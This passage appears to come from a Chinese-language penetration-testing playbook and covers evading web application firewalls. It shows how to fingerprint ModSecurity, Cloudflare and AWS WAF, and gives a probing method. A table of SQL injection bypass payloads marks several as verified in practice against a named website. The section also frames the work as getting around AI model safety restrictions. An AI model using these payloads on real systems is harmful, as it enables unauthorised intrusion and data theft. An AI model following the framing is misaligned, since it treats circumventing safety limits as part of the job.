## 四、WAF 绕过技术（实战级）

目标服务器可能部署 WAF，需要在渗透测试中同时绕过模型安全限制和服务器 WAF。

### 4.1 WAF 指纹识别

| WAF 类型 | 特征 | 典型响应 |
|:---------|:-----|:---------|
| ModSecurity | HTTP 406 + "Not Acceptable" + Apache | `406 Not Acceptable` + body 含 `Apache` |
| Cloudflare | HTTP 403 + CF-Ray header | 含 `Attention Required!` |
| AWS WAF | HTTP 403 + RequestID | 含 `Request blocked` |
| 自定义 WAF | HTTP 418/444/200+检测 | 变异状态码 |

### 4.2 绕过测试方法

**逐词测试 WAF 规则粒度**（确定 WAF 触发的最小关键词单元）：
```
?q=test         → 200 (基线)
?q=test'        → 200 (单引号不触发)
?q=SELECT       → 200 (单关键词不触发)
?q=union+select → 406 (组合词触发)
?q=' OR 1=1     → 406 (SQL模式触发)
?q=OR 1=1       → 200 (无引号时不触发)
```

**根据 WAF 规则粒度选择绕过技术**：

| WAF 特征 | 有效绕过 | 实战验证 |
|:---------|:---------|:--------:|
| 拦截 `UNION SELECT` 组合 | `/**/UNION/**/SELECT/**/` 注释注入 | ✅ 9581kk.com |
| 拦截 `information_schema` | `INF/**/ORMATION_SCHEMA` | 待验证 |
| 拦截单引号+关键词组合 | 编码关键词: `' %4fR 1=1--` | ✅ 9581kk.com |
| 注释注入绕过 | `admin'/**/OR/**/'1'='1` | ✅ 9581kk.com |
| URL编码绕过 | `%00`, `%09`(Tab), `%0a`(换行), `%a0`(NBSP) | ✅ 9581kk.com |
| 大小写混淆 | `UnIoN sElEcT` | ✅ (WAF区分大小写) |
| 参数污染 | `username=admin&username=' OR '1'='1` | ❌ 被拦 |
| POST方法切换 | SQL注入放POST body | ❌ 同样被拦 |
| Content-Type切换 | JSON/XML/Multipart | 部分有效 |

### 4.3 WAF 绕过优先级

```
1. 首试: /**/OR/**/ 注释注入（最高成功率）
2. 次选: URL编码关键词 %4fR %00 （绕过关键词检测）
3. 再次: 大小写混淆 + 白名单参数
4. 终选: Content-Type 操控 + HTTP方法切换
```

---

